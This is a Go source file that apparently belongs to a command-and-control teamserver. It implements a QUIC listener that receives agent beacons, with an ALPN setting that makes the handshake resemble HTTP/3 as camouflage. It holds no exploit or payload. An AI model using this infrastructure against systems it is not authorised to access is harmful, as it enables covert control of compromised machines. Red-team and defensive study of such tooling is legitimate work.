package server

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log/slog"
	"net"
	"runtime/debug"
	"strings"
	"sync"
	"time"

	"github.com/quic-go/quic-go"
)

const quicMaxBeacon = 16 * 1024 * 1024

// QUICBeaconListener accepts QUIC (TLS 1.3) connections and treats each
// stream as one beacon cycle: read request until EOF, run the shared
// envelope handler, write the response. ALPN is h3/fc2 so the handshake
// resembles HTTP/3; the payload is still the v2 ECDH envelope.
type QUICBeaconListener struct {
	mu      sync.Mutex
	addr    string
	tlsCfg  *tls.Config
	ln      *quic.Listener
	handler func(agentID string, reqJSON []byte) []byte
	running bool
	cancel  context.CancelFunc
}

func NewQUICBeaconListener(addr string, tlsCfg *tls.Config) *QUICBeaconListener {
	cfg := tlsCfg.Clone()
	if len(cfg.NextProtos) == 0 {
		cfg.NextProtos = []string{"h3", "fc2"}
	}
	cfg.MinVersion = tls.VersionTLS13
	return &QUICBeaconListener{addr: addr, tlsCfg: cfg}
}

func (l *QUICBeaconListener) SetHandler(h func(agentID string, reqJSON []byte) []byte) {
	l.mu.Lock()
	l.handler = h
	l.mu.Unlock()
}

func (l *QUICBeaconListener) Start() error {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.running {
		return nil
	}
	ln, err := quic.ListenAddr(l.addr, l.tlsCfg, &quic.Config{
		MaxIdleTimeout:  30 * time.Second,
		KeepAlivePeriod: 10 * time.Second,
	})
	if err != nil {
		return err
	}
	ctx, cancel := context.WithCancel(context.Background())
	l.ln = ln
	l.cancel = cancel
	l.running = true
	slog.Info("QUIC beacon listener starting", "addr", ln.Addr().String())
	go l.acceptLoop(ctx, ln)
	return nil
}

func (l *QUICBeaconListener) acceptLoop(ctx context.Context, ln *quic.Listener) {
	// ln is passed in from Start() under lock — Stop() writes l.ln = nil
	// under the same mutex, so reading the field here would be a data race.
	// A single transient Accept error (EMFILE under fd pressure, temporary
	// resource exhaustion) used to kill the loop permanently while running
	// stayed true — the transport was dead but the UI reported it up. Back
	// off briefly on temporary errors and only give up after repeated
	// non-temporary failures, flipping running so status stays honest.
	consecutiveErrors := 0
	for {
		conn, err := ln.Accept(ctx)
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
			}
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				consecutiveErrors++
				if consecutiveErrors < 10 {
					time.Sleep(100 * time.Millisecond)
					continue
				}
			} else if isTemporaryNetErr(err) {
				consecutiveErrors++
				if consecutiveErrors < 20 {
					time.Sleep(250 * time.Millisecond)
					continue
				}
			} else {
				consecutiveErrors++
			}
			slog.Error("QUIC accept loop giving up", "err", err, "consecutive_errors", consecutiveErrors)
			l.mu.Lock()
			l.running = false
			l.mu.Unlock()
			return
		}
		consecutiveErrors = 0
		go l.handleConn(ctx, conn)
	}
}

// isTemporaryNetErr mirrors net.Error.Temporary for wrapper errors that only
// implement the interface via Unwrap.
func isTemporaryNetErr(err error) bool {
	if ne, ok := err.(net.Error); ok {
		return ne.Temporary()
	}
	msg := err.Error()
	return strings.Contains(msg, "too many open files") ||
		strings.Contains(msg, "resource temporarily unavailable")
}

func (l *QUICBeaconListener) handleConn(ctx context.Context, conn *quic.Conn) {
	defer conn.CloseWithError(0, "")
	for {
		stream, err := conn.AcceptStream(ctx)
		if err != nil {
			return
		}
		go l.handleStream(stream)
	}
}

func (l *QUICBeaconListener) handleStream(stream *quic.Stream) {
	defer func() {
		// Beacon bytes are attacker-controlled and this runs on its own
		// goroutine: a panic here would crash the whole teamserver.
		if rec := recover(); rec != nil {
			slog.Error("Panic in QUIC stream handler", "recover", rec, "stack", string(debug.Stack()))
		}
	}()
	defer stream.Close()
	limited := io.LimitReader(stream, quicMaxBeacon+1)
	req, err := io.ReadAll(limited)
	if err != nil || len(req) == 0 || len(req) > quicMaxBeacon {
		return
	}
	l.mu.Lock()
	h := l.handler
	l.mu.Unlock()
	if h == nil {
		return
	}
	resp := h("", req)
	if len(resp) == 0 {
		return
	}
	_, _ = stream.Write(resp)
}

func (l *QUICBeaconListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.cancel != nil {
		l.cancel()
	}
	if l.ln != nil {
		_ = l.ln.Close()
		l.ln = nil
	}
	l.running = false
	return nil
}

func (l *QUICBeaconListener) Close() error {
	return l.Stop()
}

func (l *QUICBeaconListener) IsRunning() bool {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.running
}

func (l *QUICBeaconListener) Addr() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.ln == nil {
		return l.addr
	}
	return l.ln.Addr().String()
}

func (s *Server) quicTLSConfig() (*tls.Config, error) {
	if s.cfg == nil || s.cfg.Server.CertFile == "" || s.cfg.Server.KeyFile == "" {
		return nil, fmt.Errorf("QUIC requires TLS cert/key (server.cert_file / key_file)")
	}
	cert, err := tls.LoadX509KeyPair(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
	if err != nil {
		return nil, err
	}
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
		NextProtos:   []string{"h3", "fc2"},
	}, nil
}

func (s *Server) startQUICListener() {
	tlsCfg, err := s.quicTLSConfig()
	if err != nil {
		slog.Error("QUIC listener TLS", "err", err)
		return
	}
	l := NewQUICBeaconListener(s.cfg.Server.QUICAddr, tlsCfg)
	l.SetHandler(s.makeBeaconHandler())
	if err := l.Start(); err != nil {
		slog.Error("Failed to start QUIC listener", "addr", s.cfg.Server.QUICAddr, "err", err)
		return
	}
	s.quicListener = l
	<-s.ctx.Done()
	l.Close()
}

func (s *Server) startExtraQUICListener(key string) error {
	addr := strings.TrimPrefix(key, "quic://")
	tlsCfg, err := s.quicTLSConfig()
	if err != nil {
		return err
	}
	l := NewQUICBeaconListener(addr, tlsCfg)
	l.SetHandler(s.makeBeaconHandler())
	if err := l.Start(); err != nil {
		return err
	}
	s.extraListenersMu.Lock()
	s.extraListeners[key] = l
	s.extraListenersMu.Unlock()
	slog.Info("Extra QUIC listener started", "addr", addr, "key", key)
	return nil
}
